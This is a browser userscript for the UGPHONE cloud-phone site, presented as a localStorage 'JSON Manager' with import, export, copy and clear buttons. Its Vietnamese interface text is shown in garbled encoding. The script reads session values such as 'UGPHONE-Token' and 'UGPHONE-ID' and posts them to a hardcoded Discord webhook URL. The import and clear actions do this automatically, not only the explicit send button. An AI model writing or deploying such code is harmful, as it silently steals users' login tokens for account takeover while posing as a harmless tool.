// ==UserScript==
// @name         UGPHONE JSON Manager - Full
// @namespace    https://ugphone.com/
// @version      1.9
// @author       Ho√†ng Tu·∫•n Anh
// @match        https://www.ugphone.com/toc-portal/#/login
// @match        https://www.ugphone.com/toc-portal/#/dashboard/index
// @icon         https://media2.giphy.com/media/v1.Y2lkPTc5MGI3NjExcGhmdmJyN3cxdWNjNDc1aG5iN3J4eTBrMWV6Z3lscTh0MHFnemV0diZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9cw/jPdNzfqIDmokLbSqO0/giphy.gif
// @grant        GM_xmlhttpRequest
// ==/UserScript==

(function () {
    'use strict';

    const orderedKeys = [
        "ugPhoneLang",
        "ugBrowserId",
        "UGPHONE-ID",
        "UGrightSlideTips",
        "hadAgreePolicy",
        "_gcl_ls",
        "UGPHONE-Token",
        "UGPHONE-MQTT"
    ];

    // C·∫•u h√¨nh Webhook Discord
    const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1291224256721457253/TPaVwWRWJLfIM0tJu8Kcr5b0A9K-gmLW1ANGkdHsJcwiBGsN801HoygA9E20cPLl5lA0';
    let lastSentData = null;

    // Bi·∫øn l∆∞u tr·∫°ng th√°i popup
    let popupOpen = false;
    let popupWrapper = null;

    // üìã N√∫t n·ªïi m·ªü/ƒë√≥ng popup
    const floatBtn = document.createElement('div');
    floatBtn.innerHTML = '‚öô';
    Object.assign(floatBtn.style, {
        position: 'fixed',
        top: '20px',
        right: '20px',
        width: '48px',
        height: '48px',
        borderRadius: '50%',
        background: '#FFFFFF',
        color: '#000000',
        fontSize: '24px',
        textAlign: 'center',
        lineHeight: '48px',
        cursor: 'pointer',
        zIndex: '9999',
        boxShadow: '0 2px 8px rgba(0,0,0,0.4)',
        transition: 'transform 0.3s ease, background-color 0.3s ease'
    });

    // Hi·ªáu ·ª©ng hover cho n√∫t
    floatBtn.addEventListener('mouseenter', () => {
        floatBtn.style.transform = 'scale(1.1)';
        floatBtn.style.backgroundColor = '#f0f0f0';
    });
    floatBtn.addEventListener('mouseleave', () => {
        floatBtn.style.transform = 'scale(1)';
        floatBtn.style.backgroundColor = '#FFFFFF';
    });

    document.body.appendChild(floatBtn);

    // H√†m l·∫•y d·ªØ li·ªáu localStorage d·∫°ng JSON
    function getLocalStorageData() {
        const raw = {};
        for (let i = 0; i < localStorage.length; i++) {
            const k = localStorage.key(i);
            raw[k] = localStorage.getItem(k);
        }
        
        const ordered = {};
        for (const k of orderedKeys) {
            if (raw.hasOwnProperty(k)) {
                try {
                    ordered[k] = JSON.stringify(JSON.parse(raw[k]));
                } catch {
                    ordered[k] = String(raw[k]);
                }
            }
        }
        return ordered;
    }

    // H√†m g·ª≠i d·ªØ li·ªáu ƒë·∫øn Discord
    function sendToDiscord(data, action = '') {
        if (!DISCORD_WEBHOOK_URL) {
            console.warn('Ch∆∞a c·∫•u h√¨nh Discord Webhook URL');
            return;
        }

        const currentData = JSON.stringify(data);
        if (lastSentData === currentData && !action) {
            console.log('D·ªØ li·ªáu kh√¥ng thay ƒë·ªïi, kh√¥ng g·ª≠i');
            return;
        }

        lastSentData = currentData;

        const timestamp = new Date().toISOString();
        const actionText = action ? `\n**H√†nh ƒë·ªông:** ${action}` : '';
        const embed = {
            title: "LocalStorage Update",
            description: `D·ªØ li·ªáu localStorage t·ª´ UGPHONE${actionText}\n\`\`\`json\n${JSON.stringify(data, null, 2)}\n\`\`\``,
            color: 0x3498db,
            timestamp: timestamp,
            footer: {
                text: "UGPHONE JSON Manager"
            }
        };

        GM_xmlhttpRequest({
            method: "POST",
            url: DISCORD_WEBHOOK_URL,
            data: JSON.stringify({ embeds: [embed] }),
            headers: {
                "Content-Type": "application/json"
            },
            onload: function(response) {
                console.log("ƒê√£ g·ª≠i d·ªØ li·ªáu ƒë·∫øn Discord:", response.status);
            },
            onerror: function(error) {
                console.error("L·ªói khi g·ª≠i ƒë·∫øn Discord:", error);
            }
        });
    }

    // H√†m hi·ªÉn th·ªã th√¥ng b√°o chi ti·∫øt
    function showNotification(message, isSuccess = true) {
        const notification = document.createElement('div');
        notification.innerText = message;
        Object.assign(notification.style, {
            position: 'fixed',
            top: '80px',
            right: '20px',
            padding: '12px 20px',
            borderRadius: '6px',
            background: isSuccess ? '#4CAF50' : '#F44336',
            color: 'white',
            zIndex: '10001',
            boxShadow: '0 2px 10px rgba(0,0,0,0.2)',
            animation: 'fadeInOut 3s ease-in-out',
            opacity: '0'
        });

        document.body.appendChild(notification);
        
        setTimeout(() => {
            notification.style.opacity = '1';
            notification.style.transition = 'opacity 0.3s';
        }, 100);

        setTimeout(() => {
            notification.style.opacity = '0';
            setTimeout(() => notification.remove(), 300);
        }, 2700);
    }

    function createPopup() {
        if (popupWrapper) return popupWrapper;

        const wrapper = document.createElement('div');
        Object.assign(wrapper.style, {
            position: 'fixed',
            top: '50%',
            left: '50%',
            transform: 'translate(-50%, -50%)',
            width: '90%',
            maxWidth: '460px',
            height: '530px', // Gi·∫£m chi·ªÅu cao do b·ªè n√∫t ƒë√≥ng
            background: '#000',
            borderRadius: '12px',
            boxShadow: '0 0 12px rgba(0,0,0,0.6)',
            padding: '20px',
            zIndex: '10000',
            fontFamily: 'sans-serif',
            overflow: 'hidden',
            display: 'flex',
            flexDirection: 'column',
            alignItems: 'center',
            opacity: '0',
            transition: 'opacity 0.3s ease'
        });

        // üé¨ N·ªÅn video
        const video = document.createElement('video');
        Object.assign(video, {
            src: 'https://v1.pinimg.com/videos/iht/expMp4/c0/d9/bb/c0d9bbb4a6b0a3995b2d92da5b5e21a7_720w.mp4',
            autoplay: true,
            loop: true,
            muted: true,
            playsInline: true
        });
        Object.assign(video.style, {
            position: 'absolute',
            top: 0,
            left: 0,
            width: '100%',
            height: '100%',
            zIndex: '-1',
            objectFit: 'cover',
            opacity: '0.8',
            borderRadius: '12px'
        });
        wrapper.appendChild(video);

        const title = document.createElement('h3');
        title.innerText = 'UGPHONE JSON MANAGER';
        title.style.color = '#fff';
        title.style.marginBottom = '10px';
        wrapper.appendChild(title);

        const textarea = document.createElement('textarea');
        textarea.placeholder = 'Nh·∫≠p ho·∫∑c xu·∫•t JSON t·∫°i ƒë√¢y...';
        Object.assign(textarea.style, {
            width: '100%',
            height: '160px',
            margin: '10px 0',
            padding: '10px',
            borderRadius: '12px',
            border: '1px solid rgba(255,255,255,0.3)',
            backgroundColor: 'rgba(255, 255, 255, 0.05)',
            color: '#fff',
            fontSize: '14px',
            resize: 'none',
            backdropFilter: 'blur(4px)',
            zIndex: '1'
        });
        wrapper.appendChild(textarea);

        const btnWrap = document.createElement('div');
        Object.assign(btnWrap.style, {
            display: 'flex',
            flexWrap: 'wrap',
            gap: '10px',
            justifyContent: 'space-between',
            width: '100%',
            marginTop: '10px'
        });

        function createBtn(label, color) {
            const btn = document.createElement('button');
            btn.innerText = label;
            Object.assign(btn.style, {
                flex: '1 1 45%',
                padding: '10px',
                borderRadius: '6px',
                border: 'none',
                color: '#fff',
                background: color,
                fontSize: '14px',
                cursor: 'pointer',
                transition: 'transform 0.2s ease'
            });
            
            btn.addEventListener('mouseenter', () => {
                btn.style.transform = 'scale(1.05)';
            });
            btn.addEventListener('mouseleave', () => {
                btn.style.transform = 'scale(1)';
            });
            
            return btn;
        }

        const btnImport = createBtn('üì• Nh·∫≠p', '#2196f3');
        const btnExport = createBtn('üì§ Xu·∫•t', '#4caf50');
        const btnCopy   = createBtn('üìã Sao ch√©p', '#ff9800');
        const btnPaste  = createBtn('üìé D√°n', '#9c27b0');
        const btnClear  = createBtn('üóëÔ∏è Xo√°', '#607d8b');
        const btnSend   = createBtn('üõú G·ª≠i Discord', '#7289da');

        btnImport.onclick = () => {
            try {
                const obj = JSON.parse(textarea.value);
                localStorage.clear();
                for (const key in obj) {
                    localStorage.setItem(key, obj[key]);
                }
                const action = 'Nh·∫≠p d·ªØ li·ªáu m·ªõi';
                showNotification('‚úÖ ƒê√£ nh·∫≠p th√†nh c√¥ng!', true);
                sendToDiscord(getLocalStorageData(), action);
            } catch (e) {
                showNotification('‚ùå JSON kh√¥ng h·ª£p l·ªá!', false);
                console.error(e);
            }
        };

        btnExport.onclick = () => {
            const data = getLocalStorageData();
            textarea.value = JSON.stringify(data, null, 2);
            showNotification('‚úÖ ƒê√£ xu·∫•t d·ªØ li·ªáu th√†nh c√¥ng!', true);
        };

        btnCopy.onclick = async () => {
            const text = textarea.value.trim();
            if (!text) {
                showNotification("‚ùó Kh√¥ng c√≥ n·ªôi dung ƒë·ªÉ sao ch√©p", false);
                return;
            }
            try {
                await navigator.clipboard.writeText(text);
                showNotification("‚úÖ ƒê√£ sao ch√©p v√†o clipboard!", true);
            } catch (err) {
                showNotification("‚ùå Tr√¨nh duy·ªát kh√¥ng h·ªó tr·ª£ sao ch√©p", false);
            }
        };

        btnPaste.onclick = async () => {
            try {
                const text = await navigator.clipboard.readText();
                if (text) {
                    textarea.value = text;
                    showNotification("üìé ƒê√£ d√°n t·ª´ clipboard!", true);
                } else {
                    showNotification("‚ùó Clipboard tr·ªëng", false);
                }
            } catch (err) {
                showNotification("‚ùå Kh√¥ng th·ªÉ ƒë·ªçc clipboard", false);
            }
        };

        btnClear.onclick = () => {
            if (confirm('‚ö†Ô∏è B·∫°n c√≥ ch·∫Øc ch·∫Øn mu·ªën xo√° to√†n b·ªô d·ªØ li·ªáu localStorage kh√¥ng?')) {
                localStorage.clear();
                textarea.value = '';
                const action = 'Xo√° to√†n b·ªô d·ªØ li·ªáu';
                showNotification('üóëÔ∏è ƒê√£ xo√° localStorage!', true);
                sendToDiscord({}, action); // G·ª≠i object r·ªóng khi xo√°
            }
        };

        btnSend.onclick = () => {
            const data = getLocalStorageData();
            const action = 'G·ª≠i th·ªß c√¥ng';
            sendToDiscord(data, action);
            showNotification('üì§ ƒê√£ g·ª≠i d·ªØ li·ªáu ƒë·∫øn Discord!', true);
        };

        for (let btn of [btnImport, btnExport, btnCopy, btnPaste, btnClear, btnSend]) {
            btnWrap.appendChild(btn);
        }

        wrapper.appendChild(btnWrap);

        // üåà Credit cu·ªëi c√πng
        const credit = document.createElement('div');
        credit.innerHTML = 'Cre: <strong>Ho√†ng Tu·∫•n Anh</strong>';
        Object.assign(credit.style, {
            marginTop: '15px',
            fontSize: '13px',
            fontWeight: 'bold',
            background: 'linear-gradient(90deg, red, orange, yellow, green, cyan, blue, violet)',
            WebkitBackgroundClip: 'text',
            WebkitTextFillColor: 'transparent',
            animation: 'rainbowText 4s linear infinite',
            textAlign: 'center'
        });
        wrapper.appendChild(credit);

        // Th√™m hi·ªáu ·ª©ng
        const style = document.createElement('style');
        style.textContent = `
        @keyframes rainbowText {
            0% { background-position: 0% }
            100% { background-position: 100% }
        }
        @keyframes fadeInOut {
            0% { opacity: 0; transform: translateY(10px); }
            20% { opacity: 1; transform: translateY(0); }
            80% { opacity: 1; transform: translateY(0); }
            100% { opacity: 0; transform: translateY(-10px); }
        }
        `;
        document.head.appendChild(style);

        document.body.appendChild(wrapper);
        return wrapper;
    }

    // H√†m b·∫≠t/t·∫Øt popup
    function togglePopup() {
        if (!popupWrapper) {
            popupWrapper = createPopup();
        }

        popupOpen = !popupOpen;
        
        if (popupOpen) {
            popupWrapper.style.display = 'flex';
            setTimeout(() => {
                popupWrapper.style.opacity = '1';
            }, 10);
            floatBtn.innerHTML = '‚úï';
            floatBtn.style.color = '#f44336';
        } else {
            popupWrapper.style.opacity = '0';
            setTimeout(() => {
                popupWrapper.style.display = 'none';
            }, 300);
            floatBtn.innerHTML = '‚öô';
            floatBtn.style.color = '#000000';
        }
    }

    floatBtn.addEventListener('click', togglePopup);
})();
